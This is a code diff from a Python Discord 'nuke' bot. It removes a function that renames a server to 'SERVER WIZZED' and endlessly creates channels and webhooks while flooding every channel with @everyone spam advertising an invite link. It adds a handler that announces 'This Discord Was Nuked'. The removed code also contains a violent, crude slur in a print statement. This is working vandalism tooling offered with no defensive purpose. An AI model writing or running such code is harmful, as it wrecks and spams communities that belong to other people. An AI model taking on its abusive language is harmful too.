@@ -66,35 +66,6 @@ async def create_roles(guild, name):
             continue
     return created
 
-async def pingspam(ctx):
-    await ctx.guild.edit(name="SERVER WIZZED")
-    print("raped channels <3")
-    latters = "a:b:c:d:e:f:g:h:i:j:k:l:m:n:o:p:q:r:s:t:u:v:w:x:y:,:+:*:/:#: "
-    lattersL = latters.split()
-    while True:
-      for time in range(random.randint(4,10)):
-        r1 = random.choice(lattersL)
-      try:
-        await guild.create_text_channel("nuked")
-        await guild.create_voice_channel("wizzed")
-      except:
-        pass 
-      for channel in ctx.guild.text_channels:
-        try:
-          webhook = discord.utils.get(await ctx.channel.webhooks(), name='Spammer')
-          await channel.send(f"Nuked! @everyone https://discord.gg/A7nAbRFdjD TOOL RUNS YOU         {r1}")
-          await ctx.channel.create_webhook(name="wizzed by tool")
-          await channel.send(f"Nuked! @everyone https://discord.gg/A7nAbRFdjD TOOL RUNS YOU   {r1}")
-          await ctx.channel.create_webhook(name="wizzed")
-          await channel.send(f"Nuked! @everyone https://discord.gg/A7nAbRFdjD TOOL RUNS YOU                {r1}")
-          await ctx.channel.create_webhook(name="wizzed by tool")
-          await channel.send(f"Nuked! @everyone https://discord.gg/A7nAbRFdjD TOOL RUNS YOU     {r1}")
-          await ctx.channel.create_webhook(name="wizzed")
-          await channel.send(f"Nuked! @everyone https://discord.gg/A7nAbRFdjD TOOL RUNS YOU              {r1}")
-          await webhook.send()
-        except:
-          pass
-
 
 async def create_text_channels(guild, name):
     created = 0
@@ -105,6 +76,12 @@ async def create_text_channels(guild, name):
         except:
             continue
     return created
+
+async def on_ready():  #Called when internal cache is loaded
+
+    channel = client.get_channel(channel_id) #  Gets channel from internal cache
+    await channel.send("@everyone This Discord Was Nuked") #  Sends message to channel
+
 
 async def nuke_guild(guild):
     print(f'{r}Nuke: {m}{guild.name}')
